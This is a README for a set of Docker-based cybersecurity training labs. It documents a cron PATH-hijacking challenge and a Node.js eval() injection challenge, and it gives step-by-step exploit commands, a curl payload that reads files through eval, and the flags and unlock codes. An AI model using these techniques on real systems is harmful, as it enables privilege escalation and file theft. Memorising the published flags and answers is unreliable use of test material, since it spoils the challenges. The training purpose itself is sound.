# Altaïr Lab Templates

> **Docker-based lab environments for hands-on cybersecurity training**
> 

[![Docker](https://img.shields.io/badge/docker-required-2496ED)](https://www.docker.com)

[![GKE](https://img.shields.io/badge/runtime-GKE-326CE5)](https://cloud.google.com/kubernetes-engine)

---

## Description

**Altaïr Lab Templates** are pre-configured Docker images that provide isolated, ephemeral environments for cybersecurity labs. Each template implements a specific vulnerability or learning scenario that students can exploit or explore.

Templates are designed to run in **Google Kubernetes Engine** via the Lab API Service, but can also be built and tested locally for development.

**Key characteristics:**

- Self-contained Docker images with all dependencies
- `metadata.json` for pedagogical structure (steps, hints, validation)
- Aligned with Altaïr lab types (guided, non-guided, terminal, web)
- Flag-based validation for CTF-style challenges
- Production-ready for Artifact Registry + GKE deployment

---

## Lab Types Alignment

Altaïr defines 5 lab types. This repository currently provides templates for **2 types**:

| Lab Type | Template Available | Description |
| --- | --- | --- |
| **Lab Cours** | ❌ Not yet | Educational environment without exploitation |
| **CTF Terminal Guidé** | ✅ `ctf-terminal/` | Guided terminal exploitation with step-by-step instructions |
| **CTF Terminal Non Guidé** | ❌ Variant of terminal | Same image, different metadata structure |
| **CTF Web Guidé** | ✅ `ctf-web/` | Guided web exploitation with HTTP challenges |
| **CTF Web Non Guidé** | ❌ Variant of web | Same image, different metadata structure |

**Note:** "Guidé" vs "Non Guidé" is primarily a **metadata difference** (step-by-step vs hints-only), not necessarily separate Docker images.

---

## Repository Structure

```
altair-lab-templates/
├── README.md                   # This file
├── .gitignore
│
├── ctf-terminal/               # Terminal-based exploitation template
│   ├── Dockerfile
│   ├── metadata.json          # Lab structure (steps, hints, validation)
│   ├── backup.sh              # Vulnerable script
│   └── README.md
│
└── ctf-web/                    # Web-based exploitation template
    ├── Dockerfile
    ├── metadata.json          # Lab structure
    ├── contents/              # Web application
    │   ├── server.js          # Express server (vulnerable)
    │   ├── package.json
    │   ├── flag.txt
    │   ├── public/
    │   │   ├── index.html
    │   │   ├── app.js
    │   │   └── styles.css
    │   └── README.md
    └── README.md
```

---

## Template Components

### 1. Dockerfile

Defines the container image with:

- Base OS (Debian, Alpine, Node, etc.)
- Installed tools and dependencies
- Vulnerable configuration
- Flag file placement
- User setup (`student` user with limited permissions)

### 2. metadata.json

Pedagogical structure consumed by Labs microservice:

```json
{
  "lab_id": "uuid",
  "name": "Lab name",
  "lab_type": "ctf_terminal_guided|ctf_web_guided",
  "difficulty": "beginner|intermediate|advanced",
  "category": "linux|web|network|...",
  "estimated_duration": "25min",
  "story": "Challenge narrative",
  "objectives": ["Learn X", "Exploit Y"],
  "template_path": "europe-west9-docker.pkg.dev/PROJECT/altair-labs/IMAGE:TAG",
  "steps": [
    {
      "step_number": 1,
      "title": "Step title",
      "description": "Instructions",
      "question": "What did you find?",
      "expected_answer": "answer",
      "validation_type": "exact_match",
      "points": 10,
      "hints": [
        {
          "hint_number": 1,
          "cost": 5,
          "text": "First hint"
        }
      ]
    }
  ]
}
```

**Mapping to database schema:**

- `metadata.json` → `labs` table
- `steps[]` → `lab_steps` table
- `hints[]` → `lab_hints` table
- `template_path` → Used by Lab API Service to spawn pods

---

## CTF Terminal Template

### Overview

Demonstrates **PATH hijacking via cron job** exploitation.

**Vulnerability:** A root cron job executes a script with an insecure `PATH`, allowing an attacker to place a malicious binary in `/tmp`.

**Lab Type:** `ctf_terminal_guided`

**Flag:** `FLAG{path_hijacking_pwned_2026}`

### Environment Details

**Base Image:** `debian:latest`

**User:** `student` / `student` (password)

**Vulnerable Setup:**

- Cron job runs `/opt/[backup.sh](http://backup.sh)` as root every minute
- Cron `PATH` includes `/tmp` first: `PATH=/tmp:/usr/local/sbin:...`
- Script calls `tar` without absolute path
- Flag located in `/root/flag.txt` (chmod 600)

**Container Lifecycle:**

```bash
# Starts cron daemon
# Tails backup log to keep container alive
CMD ["sh", "-c", "cron && tail -f /var/log/backup.log"]
```

### Exploitation Flow (3 Steps)

**Step 1:** Reconnaissance – Identify the cron job and script location  

**Step 2:** Analyze the vulnerability – Discover `tar` is called without absolute path  

**Step 3:** Exploit – Create malicious `/tmp/tar` to exfiltrate flag

**Expected payload:**

```bash
#!/bin/bash
cat /root/flag.txt > /opt/output/flag.txt
```

### Building and Running Locally

```bash
# Build
cd ctf-terminal
docker build -t altair-lab-terminal:local .

# Run
docker run --rm -it \
  --name lab-terminal-test \
  altair-lab-terminal:local

# Inside container
su - student
# Password: student

# Exploit
echo '#!/bin/bash' > /tmp/tar
echo 'cat /root/flag.txt > /opt/output/flag.txt' >> /tmp/tar
chmod +x /tmp/tar
# Wait 1 minute for cron to execute
cat /opt/output/flag.txt
```

---

## CTF Web Template

### Overview

Demonstrates **JavaScript eval() code injection** vulnerability in a Node.js API.

**Vulnerability:** An Express endpoint evaluates user-supplied JavaScript code without sanitization.

**Lab Type:** `ctf_web_guided`

**Flag:** `FLAG{orbital_eval_breakout}`

### Environment Details

**Base Image:** `node:20-alpine`

**Exposed Port:** `3000`

**Application Stack:**

- Express web server
- Static frontend (HTML/CSS/JS)
- Vulnerable `/diagnose` endpoint with `eval()`
- Flag stored in `/opt/flag/flag.txt`

**Authentication Flow:**

1. Bootstrap code hidden in base64 in frontend JS
2. Decode reveals unlock code: `STATION-ALTAIR`
3. Send unlock code to `/unlock` endpoint
4. Receive `unlocked=1` cookie
5. Access `/diagnose` endpoint

### Exploitation Flow (3 Steps)

**Step 1:** Reconnaissance – Discover the base64-encoded bootstrap code in browser console  

**Step 2:** Unlock the diagnostic panel – POST unlock code to `/unlock`  

**Step 3:** Code injection – Use `eval()` to read flag file

**Expected payload:**

```jsx
require("fs").readFileSync("/opt/flag/flag.txt", "utf8")
```

### Building and Running Locally

```bash
# Build
cd ctf-web
docker build -t altair-lab-web:local .

# Run
docker run --rm -it \
  -p 3000:3000 \
  --name lab-web-test \
  altair-lab-web:local

# Test in browser
open http://localhost:3000

# Or with curl
# Step 1: Unlock
curl -X POST http://localhost:3000/unlock \
  -H "Content-Type: application/json" \
  -d '{"code":"STATION-ALTAIR"}' \
  -c cookies.txt

# Step 2: Exploit
curl -X POST http://localhost:3000/diagnose \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"expression":"require(\"fs\").readFileSync(\"/opt/flag/flag.txt\",\"utf8\")"}'
```

---

## Production Deployment

### Building for Artifact Registry

```bash
# Set variables
PROJECT_ID=your-gcp-project
REGION=europe-west9
REPOSITORY=altair-labs

# Build and tag
docker build -t $REGION-docker.pkg.dev/$PROJECT_ID/$REPOSITORY/ctf-terminal:v1 ./ctf-terminal
docker build -t $REGION-docker.pkg.dev/$PROJECT_ID/$REPOSITORY/ctf-web:v1 ./ctf-web

# Push to Artifact Registry
docker push $REGION-docker.pkg.dev/$PROJECT_ID/$REPOSITORY/ctf-terminal:v1
docker push $REGION-docker.pkg.dev/$PROJECT_ID/$REPOSITORY/ctf-web:v1
```

### Updating metadata.json

After pushing images, update `template_path` in `metadata.json`:

```json
{
  "template_path": "europe-west9-docker.pkg.dev/your-project/altair-labs/ctf-terminal:v1"
}
```

### Importing to Labs Database

The `metadata.json` files should be imported into the `altair_labs_db` database:

```bash
# Example using Labs microservice API
curl -X POST http://localhost:3002/labs \
  -H "Content-Type: application/json" \
  -d @ctf-terminal/metadata.json
```

**Database mapping:**

- `metadata.json` root → `labs` table
- `steps[]` → `lab_steps` table (with `lab_id` FK)
- `hints[]` → `lab_hints` table (with `step_id` FK)

---

## Runtime Integration

### How Labs are Spawned

1. **User requests lab** via Frontend
2. **Gateway** authenticates request
3. **Sessions microservice** creates session record
4. **Lab API Service** receives spawn request with `template_path`
5. **Lab API Service**:
    - Creates ImagePullSecret for Artifact Registry
    - Creates Pod with `template_path` as container image
    - Waits for readiness
    - Returns WebShell URL
6. **Frontend** opens WebSocket to interactive terminal

### Container Requirements

**For Terminal Labs:**

- `/bin/bash` must exist
- User `student` must exist
- `su` command available
- Pod runs with WebShell access via `kubectl exec`

**For Web Labs:**

- Expose HTTP port (typically 3000 or 8080)
- ⚠️ **Current limitation:** No ingress/service exposure in MVP
    - Web labs accessible via port-forward only
    - Production requires Service + Ingress configuration

---

## Creating New Templates

### Template Checklist

- [ ]  Dockerfile with base image and dependencies
- [ ]  Vulnerable configuration (for CTF) or learning setup (for cours)
- [ ]  Flag file in secure location (CTF only)
- [ ]  `student` user with appropriate permissions
- [ ]  `metadata.json` with complete pedagogical structure
- [ ]  [README.md](http://README.md) with exploitation guide
- [ ]  Local testing (build + run + exploit)
- [ ]  Push to Artifact Registry
- [ ]  Update `template_path` in metadata
- [ ]  Import metadata to Labs microservice

### Naming Conventions

**Docker Images:**

```
<region>-docker.pkg.dev/<project>/altair-labs/<lab-name>:<version>
```

**Lab IDs (UUID v4):**

```
lab_id: "550e8400-e29b-41d4-a716-446655440000"
```

**Lab Types:**

- `lab_cours`
- `ctf_terminal_guided`
- `ctf_terminal_non_guided`
- `ctf_web_guided`
- `ctf_web_non_guided`

---

## Known Limitations

### 🟡 Current Constraints

- **Web labs not fully accessible** – No ingress/service in MVP (port-forward only)
- **Single lab type per template** – Guided/non-guided require separate metadata files
- **No multi-stage challenges** – Each lab is isolated (no chaining)
- **Hardcoded ports** – Web labs must use expected port (3000 or 8080)

### 🟡 Template Coverage

- **Lab Cours** – Not yet implemented
- **Non-guided variants** – Metadata structure defined but no examples yet
- **Advanced lab types** – Forensics, reverse engineering, network not yet covered

---

## Troubleshooting

### Image Won't Build

**Symptom:** Docker build fails with package errors.

**Solution:**

```bash
# Clear Docker cache
docker builder prune -af

# Rebuild without cache
docker build --no-cache -t image:tag .
```

### Container Exits Immediately

**Symptom:** Container stops right after starting.

**Cause:** No foreground process to keep container alive.

**Solution:** Ensure Dockerfile has proper `CMD` that runs indefinitely:

```docker
# Good: Keeps container running
CMD ["tail", "-f", "/dev/null"]
CMD ["sh", "-c", "cron && tail -f /var/log/backup.log"]

# Bad: Exits immediately
CMD ["echo", "Hello"]
```

### Flag Not Found in Container

**Symptom:** Expected flag file doesn't exist.

**Debug:**

```bash
# Check if file was created
docker run --rm -it image:tag ls -la /root/flag.txt

# Check permissions
docker run --rm -it image:tag stat /root/flag.txt
```

### Web Lab Not Accessible

**Symptom:** Cannot access web application from browser.

**Cause:** Port not exposed or not forwarded.

**Solution:**

```bash
# Ensure port is exposed in Dockerfile
EXPOSE 3000

# Run with port mapping
docker run -p 3000:3000 image:tag

# In GKE, requires Service + Ingress (not yet implemented in MVP)
```

---

## TODO / Roadmap

### High Priority (MVP → Production)

- [ ]  **Add Lab Cours template** (non-exploitation learning environment)
- [ ]  **Web lab ingress** (Service + Ingress for HTTP access in GKE)
- [ ]  **Non-guided metadata examples** (ctf_terminal_non_guided, ctf_web_non_guided)
- [ ]  **Multi-step validation** (automated checking beyond flag submission)

### Medium Priority (Template Expansion)

- [ ]  **Forensics template** (analyze compromised system, find artifacts)
- [ ]  **Network template** (packet capture, protocol analysis)
- [ ]  **Reverse engineering template** (binary analysis with Ghidra)
- [ ]  **Privilege escalation template** (kernel exploits, SUID, capabilities)

### Low Priority (Future Enhancements)

- [ ]  **Multi-stage labs** (chained challenges with persistent state)
- [ ]  **Dynamic difficulty** (hints unlock based on time or attempts)
- [ ]  **Collaborative labs** (multi-user shared environment)
- [ ]  **Custom validation scripts** (beyond flag matching)

---

## Project Status

**✅ Current Status: MVP (Minimum Viable Product)**

This template repository is **functional for MVP deployment** with 2 working templates (terminal + web). Additional lab types and production features remain for full-scale platform launch.

**Available templates:**

- ✅ CTF Terminal (PATH hijacking via cron)
- ✅ CTF Web (eval() code injection)

**Known gaps:**

1. Web labs require ingress configuration for production
2. Non-guided variants need metadata examples
3. Lab Cours type not yet implemented
4. Advanced lab types (forensics, RE, network) pending

**Maintainers:** Altaïr Platform Team

---

## Notes

- **Template path is critical** – Must match Artifact Registry URL exactly
- **Metadata structure** – Maps directly to `labs`, `lab_steps`, `lab_hints` tables
- **User permissions** – Always create `student` user with restricted access
- **Flag placement** – Flags should be readable only by root or specific exploit
- **Local testing required** – Always test build + run + exploit before pushing

---

## License

Internal Altaïr Platform Templates – Not licensed for external use.
